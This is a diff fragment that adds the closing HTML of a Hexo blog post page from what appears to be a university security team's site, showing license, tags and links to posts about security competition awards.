+                        <span><a href="https://www.xmutsec.cn/2018/02/13/a73c51fc-04d5-4aa7-bcdc-c22aa7b67512/">https://www.xmutsec.cn/2018/02/13/a73c51fc-04d5-4aa7-bcdc-c22aa7b67512/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2016 - Now <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E5%AD%A6%E6%9C%AF%E7%AB%9E%E8%B5%9B/"># 学术竞赛</a>
+                    
+                        <a href="/tags/Writeup/"># Writeup</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/04/26/86e69101-77f4-484a-ba0e-2957afabbdb6/">2018 安恒“西湖论剑杯”全国大学生网络空间安全技能大赛 个人赛三等奖</a>
+            
+            
+            <a class="next" rel="next" href="/2017/11/25/6d1aa499-57ee-401b-a911-8062c6cae869/">360第二届48小时黑客马拉松破解大奖赛第四名</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© XMUTSEC | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
